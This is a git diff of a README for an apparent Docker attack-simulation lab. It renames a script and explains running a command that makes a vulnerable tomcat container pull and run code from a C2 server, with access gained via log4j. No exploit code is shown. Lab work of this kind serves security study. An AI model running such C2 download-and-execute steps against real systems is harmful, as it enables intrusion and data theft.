@@ -27,9 +27,9 @@ How to run with Docker:
     - 127.0.0.1:8080 for exfil_data
 - C2 is run on python because it is our server and I just thought that was easiest
 - Exfil_Data is run on tomcat:8.0.36-jre8 because that is what the vulnerable-application is run on
-- I was trying to get "initial_exploit" to run automatically at start up, however that wasn't working and isn't super important so we have to run it ourselves for the time being
+- I was trying to get "initial_download" to run automatically at start up, however that wasn't working and isn't super important so we have to run it ourselves for the time being
 - I do pass the IP address of the C2 server as an environmental variable so you can see it under C2_IP in the docker. (it's 172.25.0.2)
-- just run $./initial_exploit 172.25.0.2 and the exfil_data will pull C2 code down from the C2 server and start running it
+- just run $./initial_download 172.25.0.2 and the exfil_data will pull C2 code down from the C2 server and start running it
 
 Timeline of our Attack:
 - We gain access to the vulnerable_application through log4j (this is all in initial_exploit)
